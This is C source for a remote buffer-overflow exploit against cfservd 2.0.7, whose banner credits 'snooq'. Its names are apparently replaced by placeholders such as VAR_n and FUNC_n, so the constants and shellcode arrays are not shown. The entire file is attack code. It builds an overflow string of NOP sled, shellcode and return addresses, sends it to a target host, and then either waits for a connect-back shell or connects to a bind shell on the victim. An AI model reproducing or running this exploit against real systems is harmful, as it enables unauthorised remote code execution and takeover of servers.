
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int sockadd ;


 void* VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 char VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int FUNC_0 (int,struct sockaddr*,int*) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*) ;
 scalar_t__ FUNC_3 (int,struct sockaddr*,int) ;
 void** VAR_20 ;
 int FUNC_4 (char*) ;
 int FUNC_5 (void**,int,int ) ;
 int FUNC_6 (int) ;
 void** VAR_21 ;
 scalar_t__ FUNC_7 (int,struct sockaddr*,int) ;
 int FUNC_8 (int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int ) ;
 scalar_t__ FUNC_11 () ;
 int FUNC_12 (int ,char*,...) ;
 char FUNC_13 (int,char**,char*) ;
 int FUNC_14 (int ) ;
 void* FUNC_15 (int) ;
 int FUNC_16 (char*) ;
 char* FUNC_17 (TYPE_1__) ;
 scalar_t__ FUNC_18 (int,int ) ;
 char* FUNC_19 (int) ;
 int FUNC_20 (struct sockaddr_in*,int ,int) ;
 char* VAR_22 ;
 scalar_t__ FUNC_21 (int,char*,int,int ) ;
 int FUNC_22 (int) ;
 int VAR_23 ;
 int FUNC_23 (int ,int ) ;
 int FUNC_24 (int) ;
 int FUNC_25 (void*,int ,int ) ;
 int VAR_24 ;
 scalar_t__ FUNC_26 (char*,char*) ;
 int FUNC_27 (char*) ;
 int FUNC_28 () ;

int FUNC_29(int VAR_25, char *VAR_26[]) {

 char VAR_27;
 char *VAR_28, *VAR_29, *VAR_30="";
 struct sockaddr_in VAR_31;
 int VAR_32, VAR_33, VAR_34, VAR_35, VAR_36=0, VAR_37=0;
 int VAR_38=VAR_18, VAR_39=VAR_13;
 int VAR_40=VAR_17, VAR_41=VAR_19, VAR_42=VAR_11;
 int VAR_43=VAR_12, VAR_44=VAR_1, VAR_45=VAR_2;
 long VAR_46;

 if (VAR_25<2) { FUNC_27(VAR_26[0]); }

 while ((VAR_27=FUNC_13(VAR_25,VAR_26,"i:r:b:a:h:t:s:o:T:l"))!=VAR_3) {
  switch(VAR_27) {
   case 'i':
   VAR_30=VAR_22;
   FUNC_4(VAR_30);
   break;

   case 'l':
   VAR_37=1;
   VAR_39=VAR_14;
   break;

   case 'T':
   VAR_38=FUNC_2(VAR_22);
   break;

   case 'b':
   VAR_45=FUNC_2(VAR_22);
   break;

   case 'a':
   VAR_44=FUNC_2(VAR_22);
   break;

   case 'h':
   VAR_36=1;
   VAR_31.sin_addr.s_addr = FUNC_16(VAR_22);
   break;

   case 'r':
   VAR_43=FUNC_2(VAR_22);
   break;

   case 't':
   VAR_41=FUNC_2(VAR_22);
   break;

   case 's':
   VAR_40=FUNC_2(VAR_22);
   break;

   case 'o':
   VAR_42=FUNC_2(VAR_22);
   break;

   default:
   FUNC_27(VAR_26[0]);
   break;
  }
 }

 if (!VAR_36 || (VAR_37&&((FUNC_26(VAR_30,"")==0)) ) ) { FUNC_27(VAR_26[0]); }

 if (!(VAR_28=FUNC_19(VAR_45+1))) {
  FUNC_9("-> malloc() error");
 }

 VAR_46=VAR_10-VAR_42;
 FUNC_12(VAR_24,"\nCfservd Remote Exploit by snooq [ jinyean@hotmail.com ]\n");
 FUNC_12(VAR_24,"Tested to work against cfservd 2.0.7 on Redhat 8.0\n\n");
 FUNC_12(VAR_24,"-> Using return address of 0x%08lx\n", VAR_46);

 VAR_29=VAR_28;
 for(VAR_32=0;VAR_32<VAR_5+VAR_44;VAR_32++) { *VAR_29++=VAR_4; }
 for(VAR_32=0;VAR_32<(VAR_45-VAR_5-VAR_44-VAR_39-VAR_43);VAR_32++) { *VAR_29++=VAR_7; }
 if (VAR_37) {
      FUNC_5(VAR_21, VAR_40, VAR_9);
      for(VAR_32=0;VAR_32<VAR_39;VAR_32++) { *VAR_29++=VAR_21[VAR_32]; }
 }
 else {
  FUNC_5(VAR_20, VAR_40, VAR_8);
  for(VAR_32=0;VAR_32<VAR_39;VAR_32++) { *VAR_29++=VAR_20[VAR_32]; }
 }
 for(VAR_32=0;VAR_32<VAR_43;VAR_32+=4) {
  *((long *)VAR_29)=VAR_46;
  VAR_29+=4;
 }
 *VAR_29++=0;

 VAR_31.sin_family = VAR_0;
 VAR_31.sin_port = FUNC_15(VAR_41);

 if ((VAR_33=FUNC_25(VAR_0,VAR_16,0))<0) {
  FUNC_9("-> socket error");
 }

 if(FUNC_7(VAR_33,(struct sockaddr *)&VAR_31, sizeof(VAR_31))<0) {
  FUNC_9("-> connect() error");
 }

 if (VAR_37) {

  FUNC_12(VAR_24,"-> 'Listening' mode...( port: %d )\n",VAR_40);

  if (FUNC_11()==0) {
   FUNC_24(2);
   if (FUNC_21(VAR_33,VAR_28,VAR_45,0)<0) {
    FUNC_9("-> send() error");
   }
   FUNC_12(VAR_24,"-> Exploit string sent....\n");
   FUNC_10(0);
  }

  else {

   FUNC_23(VAR_15,VAR_23);
   FUNC_1(VAR_38);

   if ((VAR_34=FUNC_25(VAR_0,VAR_16,0))<0) {
           FUNC_9("-> socket error");
   }

   FUNC_20(&VAR_31,0,sizeof(VAR_31));
   VAR_31.sin_family = VAR_0;
   VAR_31.sin_port = FUNC_15(VAR_40);
   VAR_31.sin_addr.s_addr = FUNC_14(VAR_6);
   VAR_35=sizeof(VAR_31);

   if (FUNC_3(VAR_34,(struct sockaddr *)&VAR_31,VAR_35)<0) {
    FUNC_9("-> bind() error");
   }

   if (FUNC_18(VAR_34,0)<0) {
    FUNC_9("-> listen() error");
   }

   FUNC_28();
   FUNC_6(VAR_33);
   FUNC_12(VAR_24,"-> Waiting for connection....\n");

   VAR_33=FUNC_0(VAR_34,(struct sockaddr *)&VAR_31,&VAR_35);

   if (VAR_33<0) {
    FUNC_9("-> accept() error");
   }

   FUNC_1(0);

   FUNC_12(VAR_24,"-> Connection from: %s\n",FUNC_17(VAR_31.sin_addr));

   FUNC_22(VAR_33);
   FUNC_8(VAR_33);

  }

 }

 else {

  if (FUNC_21(VAR_33,VAR_28,VAR_45,0)<0) {
   FUNC_9("-> send() error");
  }

  FUNC_6(VAR_33);

  FUNC_12(VAR_24,"-> 'Connecting' mode...\n");
  FUNC_12(VAR_24,"-> Exploit string sent. Waiting for a shell...\n");
  FUNC_24(2);

  VAR_31.sin_family = VAR_0;
  VAR_31.sin_port = FUNC_15(VAR_40);

  if ((VAR_33=FUNC_25(VAR_0,VAR_16,0))<0) {
   FUNC_9("-> socket() error");
  }

  if(FUNC_7(VAR_33,(struct sockaddr *)&VAR_31, sizeof(VAR_31))<0) {
          FUNC_12(VAR_24,"-> Exploit failed. Target probably segfaulted...\n\n");
   FUNC_10(0);
  }

  FUNC_12(VAR_24,"-> Connecting to shell at %s:%d\n",FUNC_17(VAR_31.sin_addr),VAR_40);

  FUNC_22(VAR_33);
  FUNC_8(VAR_33);

 }

 return(0);

}
